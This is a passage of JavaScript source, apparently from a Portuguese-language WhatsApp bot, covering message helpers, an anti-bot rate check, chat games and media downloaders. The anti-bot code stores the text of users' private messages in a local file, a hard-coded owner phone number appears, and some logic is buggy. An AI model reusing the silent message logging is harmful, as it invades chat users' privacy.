return number.includes('@') ? txt.split('@')[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : number.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
}

const detectTinder = (query) => {
return query.replace("#p#").replace("#p#").replace("#pc#", command).replace("#pc#", command)
}

const replyPeR = (texto) => {
  return new Promise((resolve) => {
setTimeout(() => {
safeSendMessage(from, {text: texto}, {quoted: non}).then(() => resolve()).catch((error) => {
console.log(JSON.stringify(error, null, 2));
resolve();
});
}, 1000);
});
};

const msgSemQuoted = (content, type, options = {}) => {
   const isFullUrl = (url) => new RegExp(/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)$/, 'gi').test(url);
const mediaKeys = ['image', 'video', 'sticker', 'audio', 'document', 'history', 'md-app-state'];
options[type || 'text'] = isFullUrl(content) && mediaKeys.includes(type) ? {url: content}: content;
return safeSendMessage(from, options).catch(e => {
enviar("Erro ao enviar a mensagem..");
})
}

//
const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00" && time2 < "05:00:00"){
var tempo = 'Boa noite'
} if(time2 > "05:00:00" && time2 < "12:00:00"){
var tempo = 'Bom dia'
} if(time2 > "12:00:00" && time2 < "18:00:00"){
var tempo = 'Boa tarde'
} if(time2 > "18:00:00"){
var tempo = 'Boa noite'
}

const sendSticker = (from, filename, info) => {
safeSendMessage(from, {sticker: {url: fileName}}, {quoted: non})
}

const sendImage = (ytb) => {
safeSendMessage(from, {image: {url: ytb}}, {quoted: non})
}


const sendMess = (idGroup, textINFO) => {
safeSendMessage(idGroup, {text: textINFO})
}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? safeSendMessage(from, {text: teks.trim(), mentions: memberr}) : safeSendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: non})
}
	
const mention = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
safeSendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}) 
}

const mentionSemQuoted = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
safeSendMessage(from, {text: teks.trim(), mentions: memberr}) 
}

const mencionarIMG = (teks= '', Url, ms) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
safeSendMessage(from, {image: {url: Url}, caption: teks.trim(), mentions: memberr}, {quoted: ms}) 
}

const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: info.key
}
} 
safeSendMessage(idgp, reactionMessage)
}

const getSimilarity = require(`./exports/similaridade.js`)

const similarityCmd = (txt) => {
  getsmlrt = getSimilarity(allCases, txt)
  if(rmLetras(getsmlrt.nome).includes(`erro`)) return [{comando: getsmlrt.nome, porcentagem: getsmlrt.porcentagem}]
  return [{comando: prefix+getsmlrt.nome, porcentagem: Number(getsmlrt.porcentagem).toFixed(1)}]
}

////////////////////////////////////////////

const messageText = info.message.conversation || info.message.extendedTextMessage?.text || '';

const logFilePath = './banco de dados/messages.json';

function saveMessage(from, messageText) {
  const Suprem = "558892153207";

  // Ignora se for grupo
  if (!from || from.endsWith('@g.us')) return;

  // Remove @s.whatsapp.net
  const cleanFrom = from.replace('@s.whatsapp.net', '');

  // Ignora o dono
  if (cleanFrom === Suprem) return;

  let data = {};

  if (fs.existsSync(logFilePath)) {
    const raw = fs.readFileSync(logFilePath);
    data = JSON.parse(raw);
  }

  if (!data[cleanFrom]) data[cleanFrom] = [];

  data[cleanFrom].push({
    text: messageText,
    timestamp: Date.now()
  });

  if (data[cleanFrom].length > 10) {
    data[cleanFrom] = data[cleanFrom].slice(-10);
  }

  fs.writeFileSync(logFilePath, JSON.stringify(data, null, 2));
}

const isBoty = await handleAntiBot(client, info, messageText);
if (isBoty) return;

function isTooFast(sender) {
  if (!fs.existsSync(logFilePath)) return false;

  const data = JSON.parse(fs.readFileSync(logFilePath));
  const mensagens = data[sender];
  if (!mensagens || mensagens.length < 2) return false;

  let respostasRapidas = 0;
  for (let i = 1; i < mensagens.length; i++) {
    const diff = mensagens[i].timestamp - mensagens[i - 1].timestamp;
    if (diff < 1500) respostasRapidas++; // 1 segundo
  }

  return respostasRapidas >= 1;
}

async function handleAntiBot(client, info, messageText) {
  const from = info.key.remoteJid;
  const sender = info.key.participant || from;

  if (!sender || sender.endsWith('@g.us') || sender === "558892153207@s.whatsapp.net") return false;

  saveMessage(sender, messageText);

  if (isTooFast(sender)) {
    await reagir(from, '🤖');
    return true;
  }

  return false;
}

function verificarBots() {
  if (!fs.existsSync(logFilePath)) return 'Nenhum dado disponível.';

  const raw = fs.readFileSync(logFilePath);
  const data = JSON.parse(raw);

  const suspeitos = [];

  for (const from in data) {
    const mensagens = data[from];

    if (mensagens.length < 3) continue;

    let respostasRapidas = 0;
    for (let i = 1; i < mensagens.length; i++) {
      const diff = mensagens[i].timestamp - mensagens[i - 1].timestamp;
      if (diff < 1000) respostasRapidas++;
    }

    if (respostasRapidas >= 2) {
      suspeitos.push({
        from,
        respostasRapidas,
        total: mensagens.length,
        horaUltimaMensagem: new Date(mensagens[mensagens.length - 1].timestamp).toLocaleTimeString('pt-BR', {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        })
      });
    }
  }

  if (suspeitos.length === 0) return 'Nenhum suspeito de bot encontrado.';

  let resposta = '*Lista de bots detectados:* 🤖\n—\n';
  suspeitos.forEach((s, i) => {
    resposta += `\u200B${i + 1}° ${s.from}\n`;
    resposta += `↳ Respostas rápidas: ${s.respostasRapidas}\n`;
    resposta += `↳ Total de mensagens: ${s.total}\n`;
    resposta += `↳ Última mensagem: ${s.horaUltimaMensagem}\n—\n`;
  });

  return resposta.trim();
}

////////////////////////////////////////////

const verificarN = async(sla) => {
const [result] = await client.onWhatsApp(sla)
if(result == undefined) {
enviar("Este usuário não é existente no WhatsApp")
} else {
enviar(`${sla} Número inserido é existente no WhatsApp com o id: ${result.jid}`)
}
}

const enviarfigu = async (figu, tag) => {
safeSendMessage(from, {sticker: {url: figu}}, {quoted: tag})
}

if(isAutofigu && isGroup) {
async function autofiguf() {
setTimeout(async() => {    

if(budy.includes(`sticker`) || budy.includes(`s`) || budy.includes(`stk`) || budy.includes(`st`) || budy.includes(`fsticker`) || budy.includes(`f`) || budy.includes(`fstiker`)) return

if(type == 'imageMessage') {
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(info.message.imageMessage, 'image')
let encmediaa = await sendImageAsSticker2(client, from, owgi, info, { packname:pack})
DLT_FL(encmediaa)
}
if(type == 'videoMessage') {
if((isMedia && info.message.videoMessage.seconds < 10)) {
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(info.message.videoMessage, 'video')
let encmedia = await sendVideoAsSticker2(client, from, owgi, info, { packname:pack})
DLT_FL(encmedia)
}
} 
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}

var nmrdnofc1 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")

if(isGroup && fs.existsSync(`./banco de dados/func/afk/afk-@${nmrdnofc1}.json`)) {
if(budy.indexOf(`@${nmrdnofc1}`) >= 0) {
const tabelin = JSON.parse(fs.readFileSync(`./banco de dados/func/afk/afk-@${nmrdnofc1}.json`));  
safeSendMessage(from, {text: mess.absenceRecordOwner(NickDono, tabelin)}, {quoted: non})
}
}

if(isGroup && dataGp[0].ausentes?.length > 0 && menc_jid2?.length > 0 && JSON.stringify(dataGp[0].ausentes).includes(menc_jid2)) {
blue = [] 
for (i of menc_jid2) {
if(groupAdmins.indexOf(String(i)) != -1) blue.push(groupAdmins.indexOf(String(i)))
}
if(blue.length == 0) return
big = [] 
for ( i of blue) {
big.push(groupAdmins[i])
}
blr = []
for ( i = 0; i < big.length; i++) {
blr.push(dataGp[0].ausentes[dataGp[0].ausentes.map(i => i.id).indexOf(big[i])])
}
for ( i of blr) {
var blak = i
}

mention(mess.absenceRecordAdmin(blak))
}

if(isBotGroupAdmins && isGroupAdmins && body === "apaga") {
if(!menc_prt) return
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: menc_prt}})
}

if(SoDono && budy.includes("reiniciar-nolan") || info.key.fromMe && budy.includes("reiniciar-nolan")) {
fs.writeFileSync("./cnt-upd.json",JSON.stringify([], null, 2))
setTimeout(() => {
file = require.resolve("./connect.js")  
delete require.cache[file]
require(file)  
}, 500)
setTimeout(() => {
DLT_FL("./cnt-upd.json")
}, 1500)
}

//========================================\\

//BAN GRUPO & BOT OFF
if(isGroup && isCmd && isBanchat && !SoDono) return

if(isGroup && isCmd && So_Adm && !SoDono && !isGroupAdmins) return

if(isBotoff && !SoDono) return

//=======================================\\

const sendStickerFromUrl = async(to, url) => {
try {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
safeSendMessage(to, {sticker: media}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: non}).catch(e => {
return enviar(mess.error())
})
DLT_FL(filess)
DLT_FL(asw)
});
});
} catch {
return enviar("Erro.. FNC")
}
}

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isVisuU2 = type == 'viewOnceMessageV2'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage' || type == "viewOnceMessage" || type == "viewOnceMessageV2")
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if(isImage) typeMessage = "Image"
else if(isVideo) typeMessage = "Video"
else if(isAudio) typeMessage = "Audio"
else if(isSticker) typeMessage = "Sticker"
else if(isContact) typeMessage = "Contact"
else if(isLocation) typeMessage = "Location"
else if(isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('conversation')

const isQuotedMsg2 = type === 'extendedTextMessage' && content.includes('text')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVisuU = type === 'extendedTextMessage' && content.includes('viewOnceMessage')

const isQuotedVisuU2 = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedDocW = type === 'extendedTextMessage' && content.includes('documentWithCaptionMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
            
//////BLOCK CMD///////
if(isGroup){
const checar = getComandos(from)
if(checar === undefined) addComandosId(from)
}
if(isGroup && isCmd && !SoDono && getComandoBlock(from).includes(command)) return enviar('O comando foi bloqueado, entre em contato com a administração.')

if(isBlockCmdG.includes(command) && !SoDono) return enviar('Olá, o comando está bloqueado para *uso global*, ou seja, todos os usuários estão impossibilitados de usar ele.\n–\n• Entre em contato com meu proprietário para saber o motivo.')

////FIMMMMMMMMM/////

///// SISTEMA DE DINHEIRO /////
const { AdicionarGold, RemoverGold } = require("./exports/js/dinheiro.js")

///// FIMMMMMMMMMMMMM /////

const { color, bgcolor } = require('./exports/js/color.js')
const tipoMensagem = type == 'audioMessage' ? 'Áudio' : type == 'stickerMessage' ? 'Figurinha' : type == 'imageMessage' ? 'Imagem' : type == 'videoMessage' ? 'Vídeo' : type == 'documentMessage' ? 'Documento' : type == 'contactMessage' ? 'Contato' : type == 'locationMessage' ? 'Localização' ? 'Enquete' : 'pollCreationMessage' : 'Mensagem'

//comando privado//

if (!isGroup && command) console.log(
  ' \x1b[1;35m [\x1b[1;36m 💻 COMANDO \x1b[1;35m]', color(command, "magenta"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👤 USUÁRIO \x1b[1;35m]', color(pushname, "cyan"), '\n',
  ' \x1b[1;35m[\x1b[1;36m ⏳️ HORÁRIO\x1b[1;35m]', color(time, "yellow"), '\n');

//comando em grupo//

if (command && isGroup) console.log(
  ' \x1b[1;35m [\x1b[1;36m 💻 COMANDO \x1b[1;35m]', color(command, "magenta"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👤 USUÁRIO \x1b[1;35m]', color(pushname, "cyan"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👥 GRUPOID \x1b[1;35m]', color(groupName, "green"), '\n',
  ' \x1b[1;35m[\x1b[1;36m ⏳️ HORÁRIO\x1b[1;35m]', color(time, "yellow"), '\n');

//mensagem em grupo//

if (!isCmd && isGroup && !info.key.fromMe) console.log(
  ' \x1b[1;35m [\x1b[1;36m ✉️ MENSAGE \x1b[1;35m]', color(tipoMensagem, "magenta"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👤 USUÁRIO \x1b[1;35m]', color(pushname, "cyan"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👥 GRUPOID \x1b[1;35m]', color(groupName, "green"), '\n',
  ' \x1b[1;35m[\x1b[1;36m ⏳️ HORÁRIO\x1b[1;35m]', color(time, "yellow"), '\n');


//mensagem no pv//

if (!isGroup && !isCmd && !info.key.fromMe) console.log(
  ' \x1b[1;35m [\x1b[1;36m ✉️ MENSAGE \x1b[1;35m]', color(tipoMensagem, "magenta"), '\n',
  ' \x1b[1;35m[\x1b[1;36m 👤 USUÁRIO \x1b[1;35m]', color(pushname, "cyan"), '\n',
  ' \x1b[1;35m[\x1b[1;36m ⏳️ HORÁRIO\x1b[1;35m]', color(time, "yellow"), '\n');

// ========= || Jogo da Velha || ======== \\
async function joguinhodavelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if(fs.existsSync(`./exports/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if(budy == "Cex") return enviar("why");
if(
budy.toLowerCase() == "s" ||
budy.toLowerCase() == "sim" ||
budy.toLowerCase() == "ok"
) {
if(boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if(boardnow.status)
return enviar(`O jogo já começou antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./exports/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸️🎮*
                    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
               
*SUA VEZ:* @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
mention(chatAccept);
}
} else if(
budy.toLowerCase() == "n" ||
budy.toLowerCase() == "não" ||
budy.toLowerCase() == "no"
) {
if(boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if(boardnow.status)
return enviar(`O jogo já começou, aguarde que o atual acabe para começar o proximo!`);
DLT_FL(`./exports/tictactoe/db/${from}.json`);
mention(`@${boardnow.X} *_Infelizmente seu oponente não aceitou o desafio.`)
joguinhodavelhajs.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if(arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if(!boardnow.status) return enviar(`Seu oponente não aceitou o desafio ainda.`)
if(
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(budy), `${from}`);
const matrix = moving._matrix;
if(moving.isWin) {
if(moving.winner == "SERI") {
const chatEqual = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
Terminou empatado, lembre-se que é apenas uma competição amigavel e desejo boa sorte na proxima!`;
enviar(chatEqual);
DLT_FL(`./exports/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 10;
const limLoose = Math.floor(Math.random() * 1) + 5;

setTimeout( () => {
if(fs.existsSync("./exports/tictactoe/db/" + from + ".json")) {
DLT_FL("./exports/tictactoe/db/" + from + ".json");
enviar(`*🕹️JOGO DA VELHA RESETADO.🕹️*`);
} else {
console.log(colors.red(time, "red"), colors.magenta("[ EXPIRADO ]"), colors.red('Jogo da velha espirado..'));
}
joguinhodavelhajs.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
enviar(`Parabéns @${winnerJID} você ganhou a competição, só lembre-se que é apenas um jogo e não tem premiações reais. 🥳`)   
DLT_FL(`./exports/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*『 🎮 Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸ ️🎮 』*\n-\n❌ : @${moving.X}\n⭕ : @${moving.O}\n-\nAgora é sua vez: @${moving.turn == "X" ? moving.X : moving.O}\n-\n${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}\n${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}\n${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}`;
mention(chatMove);
}
} 
} 
}

// ==========[ NAMORO ]==========\\
const namoro1 = JSON.parse(fs.readFileSync("./banco de dados/func/namoro1.json"))

const namoro2 = JSON.parse(fs.readFileSync("./banco de dados/func/namoro2.json"))

//aceitar namoro
if(budy2.toLowerCase() === "s" || budy2.toLowerCase() === "sim") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
namoro1[C12].namorados = true
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.push({usu1: sender, usu2: namoro2[C14].pedido, namorados: true, idgp: from, hora: hora, data: date})
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./banco de dados/func/namoro2.json", JSON.stringify(namoro2))
mention(`🥳 Felicitações @${namoro1[C12].usu1.split('@')[0]}! O (a) seu grande amor, @${sender.split('@')[0]}, aceitou o seu pedido de namoro.\nSeu par pode ser consultado no comando: ${prefix}minhadupla`)
}
}

//recusar namoro
if(budy2.toLowerCase() === "n" || budy2.toLowerCase().replace("ã", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} não te ama, deve está confuso(a) ou não preparado(a) e por isso não aceitou o seu pedido de namoro. 😦`)
namoro1.splice(C12, 1)
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./banco de dados/func/namoro2.json", JSON.stringify(namoro2))
}
}

//início do akinator

const akinator = JSON.parse(fs.readFileSync("./banco de dados/grupos/games/akinator.json"))

if(JSON.stringify(akinator).includes(from) && akinator[akinator.map(i => i.id).indexOf(from)].jogador === sender && akinator[akinator.map(i => i.id).indexOf(from)].finish > 0) {
  if(budy2.toLowerCase() === "sim" || budy2.toLowerCase() === "s") {
    AB = akinator.map(i => i.id).indexOf(from)
    akinator.splice(AB, 1)
    fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
    enviar(`Eu sabia cara, eu sou demais!`)
  } else if(budy2.toLowerCase().replace("ã", "a") === "nao" || budy2.toLowerCase() === "n") {
    AB = akinator.map(i => i.id).indexOf(from)
    akinator.splice(AB, 1)
    fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
    enviar(`Poxa não foi dessa vez... Quem sabe na próxima!️`)
  }
}

if(JSON.stringify(akinator).includes(from) && akinator[akinator.map(i => i.id).indexOf(from)].jogador === sender && akinator[akinator.map(i => i.id).indexOf(from)].finish <= 0 && Number(akinator[akinator.map(i => i.id).indexOf(from)].dia) === Number(moment.tz('America/Sao_Paulo').format('DD')) && isGroup) {
  AB = akinator.map(i => i.id).indexOf(from)
  if(aki.progress <= 10) per = `〔 *${aki.progress.toFixed(1)}%* 〕[▒▒▒▒▒▒▒▒▒▒]`
  if(aki.progress > 10) per = `〔 *${aki.progress.toFixed(1)}%* 〕[█▒▒▒▒▒▒▒▒▒]`
  if(aki.progress > 20) per = `〔 *${aki.progress.toFixed(1)}%* 〕[██▒▒▒▒▒▒▒▒]`
  if(aki.progress > 30) per = `〔 *${aki.progress.toFixed(1)}%* 〕[███▒▒▒▒▒▒▒]`
  if(aki.progress > 40) per = `〔 *${aki.progress.toFixed(1)}%* 〕[████▒▒▒▒▒▒]`
  if(aki.progress > 50) per = `〔 *${aki.progress.toFixed(1)}%* 〕[█████▒▒▒▒▒]`
  if(aki.progress > 60) per = `[██████▒▒▒▒] *${aki.progress.toFixed(1)}%*`
  if(aki.progress > 70) per = `[███████▒▒▒] *${aki.progress.toFixed(1)}%*`
  if(aki.progress > 80) per = `[████████▒▒] *${aki.progress.toFixed(1)}%*`
  if(aki.progress > 90) per = `[█████████▒] *${aki.progress.toFixed(1)}%*`
  if(aki.progress >= 90 || aki.currentStep >= 90) {
      await aki.win()
      jogo.now = true
      akinator[AB].finish += 1
      fs.writeFileSync("./banco de dados/grupos/games/akinator.json", JSON.stringify(akinator, null, 2))
      safeSendMessage(from, {image: {url: aki.answers[0].absolute_picture_path }, caption: `〔 ${aki.answers[0].name}: ${aki.answers[0].description} 〕\n–\n🧙🏻‍♂️ Hmm, acho que o seu personagem é esse aqui... Acertei?\n• ${II}Observação:{II} _Responda com "sim" ou "não", sem as aspas._`}, {quoted: non})
    } else {
      if(budy2.toLowerCase() === "sim" || budy2.toLowerCase() === "s") {
        await aki.step("0")
        enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: ${aki.question}\n–\n📊: ${per}`)
      }
      if(budy2.toLowerCase().replace("ã", "a") === "nao" || budy2.toLowerCase() === "n") {
        await aki.step("1")
        enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: ${aki.question}\n–\n📊: ${per}`)
      }
      if(budy2.toLowerCase().replace("ã", "a") === "nao sei" || budy2.toLowerCase() === "nsei" || budy2.toLowerCase() === "n sei") {
        await aki.step("2")
        enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: ${aki.question}\n–\n📊: ${per}`)
      }
      if(budy2.toLowerCase() === "provavelmente sim" || budy2.toLowerCase() === "provavelmente s") {
        await aki.step("3")
        enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: ${aki.question}\n–\n📊: ${per}`)
      }
      if(budy2.toLowerCase() === "provavelmente nao" || budy2.toLowerCase() === "provavelmente n") {
        await aki.step("4")
        enviar(`🧞‍♂️ *𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 𝐐𝐔𝐄𝐒𝐓𝐈𝐎𝐍𝐒:*\n• Questão: ${aki.question}\n–\n📊: ${per}`)
      }
    }
}
//
// LOADING
async function carregamento() {
var carre = [
`『 ʟᴏᴀᴅɪɴɢ 』〘█▒▒▒▒▒▒▒▒▒〙10%`,
`『 ʟᴏᴀᴅɪɴɢ 』〘███▒▒▒▒▒▒▒〙35%`,
`『 ʟᴏᴀᴅɪɴɢ 』〘█████▒▒▒▒▒〙50%`,
`『 ʟᴏᴀᴅɪɴɢ 』〘███████▒▒▒〙72%`,
`『 ʟᴏᴀᴅɪɴɢ 』〘████████▒▒〙85%`,
`『 ʟᴏᴀᴅɪɴɢ 』〘██████████〙100%`,
`✅️ *Pesquisa realizada, aguarde..*`]
let { key } = await safeSendMessage(from, {text: `*${sender.split("@")[0]} Obtendo resultado..*`, mentions: [sender]})
for (let i = 0; i < carre.length; i++) {
await safeSendMessage(from, {text: carre[i], edit: key, quoted: non});
}
}

////////////////////////////////////

const yt = require("ytdl-core")
const yts = require("yt-search")

async function getFirstVideo(query) {
try {
const result = await yts(query);
if (!result || !result.videos || result.videos.length === 0) {
return null;
}
return result.videos[0];
} catch (err) {
console.error("Erro ao buscar vídeo:", err);
return null;
}
}

const { ytmp3 } = require("@vreden/youtube_scraper");

async function downloadMP3(url, from) {
try {
let result;
try {
 result = await ytmp3(url, "92");
} catch {
 result = await ytmp3(url, "128");
}
if (result.status && result.download) {
safeSendMessage(from, {audio: {url: `${result.download.url}`}, mimetype: "audio/mpeg", ptt: true}, {quoted: non})
} else {
reagir(from, "❌")
}
} catch (error) {
console.error("Erro no download MP3:", error.message);
}
}

//====================≠≠===============\\

async function downloadDOC(url, from) {
try {
let result;
try {
 result = await ytmp3(url, "92");
} catch {
 result = await ytmp3(url, "128");
}
if (result.status && result.download) {
safeSendMessage(from, {document: {url: `${result.download.url}`}, mimetype: "audio/mpeg", fileName: 'audio.mp3'}, {quoted: non})
} else {
reagir(from, "❌")
}
} catch (error) {
console.error("Erro no download MP3:", error.message);
}
}

//====================≠≠===============\\

const { ttdl, igdl, fbdown, youtube } = require('btch-downloader');

async function DownMp4(url, from) {

try {
let res;

if (url.includes("tiktok.com")) {
res = await ttdl(url);
if (res && res.video) return safeSendMessage(from, {video: {url: res.video}, mimetype: "video/mp4"}, {quoted: non});
}

if (url.includes("instagram.com")) {
res = await igdl(url);
if (res) return safeSendMessage(from, {video: {url: res.result[0].url}, mimetype: "video/mp4" }, {quoted: non});
}

if (url.includes("facebook.com") || url.includes("fb.watch")) {
res = await fbdown(url);
if (res.Normal_video) return safeSendMessage(from, {video: {url: res.Normal_video}, mimetype: "video/mp4"}, {quoted: non});
}

if (url.includes("youtube.com") || url.includes("youtu.be")) {
res = await youtube(url);
if (res) return safeSendMessage(from, {video: {url: res.mp4}, mimetype: "video/mp4"}, {quoted: non});
}

await reagir(from, "❌");
} catch (error) {
console.error("Erro DownMp4:", error);
await reagir(from, "⚠️");
}
}
//====================≠≠===============\\

function gerarIdUnico() {
  return `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
}

function lerJSON(caminho) {
  return fs.existsSync(caminho) ? JSON.parse(fs.readFileSync(caminho)) : {};
}

